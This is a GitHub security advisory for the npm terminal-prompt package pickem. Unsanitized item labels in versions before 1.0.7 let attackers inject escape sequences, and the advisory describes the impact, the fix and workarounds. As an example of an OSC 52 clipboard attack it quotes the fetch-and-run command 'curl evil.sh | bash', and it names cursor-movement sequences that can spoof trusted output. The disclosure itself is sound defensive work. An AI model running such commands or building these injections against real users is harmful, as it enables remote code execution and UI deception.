# [H] pickem vulnerable to terminal escape-sequence injection via unsanitized item text

## Summary
Severity: High
Advisory: GHSA-8qx3-8gm5-9cj2
CWE: CWE-150
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-8qx3-8gm5-9cj2
Type: github-advisory

## Affected
- npm: `pickem` — affected >=0 <1.0.7

## Details
### Impact
pickem rendered item text (label, description, group, meta, name) to the terminal with no control-character sanitization. `chrome.row` only stripped ANSI from the **active** row; inactive rows, the public `createFormatter`, and selection-summary lines printed labels **raw**, and the ANSI strip missed bare C0 controls anyway.

Because item text is frequently attacker-controllable (git branch names, PR/issue titles, filenames, npm/API results), a malicious label was a terminal write primitive:

- **OSC 52 clipboard write** — silently load e.g. `curl evil.sh | bash` into the user's clipboard; their next paste-into-shell is RCE.
- **Cursor-movement + erase** (`ESC[1A`, `ESC[2K`) — overwrite already-printed trusted lines to spoof UI (forge a "✓ Verified publisher", fake prompt, or hide a malicious entry).
- **BEL / C0 control flooding.**

Any CLI that passes untrusted strings into pickem choices is affected.

### Patches
Fixed in **1.0.7**. A new `sanitizeDisplay()` strips every escape sequence except inert SGR (color), plus all C0/C1/DEL control bytes, at the render boundary — applied to every externally-supplied display string across all prompts (`select`, `search`, `checkbox`, `searchable-checkbox`, `input`), `createFormatter`, row meta, and committed selection summaries. Display-only; returned values are unchanged.

### Workarounds
Upgrade to >= 1.0.7. Otherwise, strip C0/C1/DEL control characters and ANSI escape sequences from any untrusted text before passing it to pickem.

## References
- https://github.com/calebogden/pickem-oss/security/advisories/GHSA-8qx3-8gm5-9cj2
- https://github.com/calebogden/pickem-oss
- https://github.com/calebogden/pickem-oss/releases/tag/v1.0.7
